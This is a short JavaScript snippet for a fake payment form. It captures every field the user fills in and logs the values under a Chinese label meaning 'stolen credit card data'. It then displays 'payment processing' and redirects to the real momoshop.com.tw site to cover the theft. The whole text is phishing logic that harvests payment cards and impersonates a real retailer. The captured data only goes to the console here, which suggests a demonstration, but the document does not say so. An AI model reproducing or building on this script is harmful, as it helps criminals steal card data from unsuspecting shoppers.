document.getElementById("payForm").addEventListener("submit", function(e) {
    e.preventDefault();
    const inputs = document.querySelectorAll("input");
    const data = Array.from(inputs).map(input => input.value);

    if (data.some(val => !val.trim())) {
        document.getElementById("payError").textContent = "請填寫所有欄位。";
        return;
    }

    console.log("偷到信用卡資料：", data);

    document.querySelector("button").textContent = "付款處理中...";
    setTimeout(() => {
        window.location.href = "https://www.momoshop.com.tw/";
    }, 3000);
});
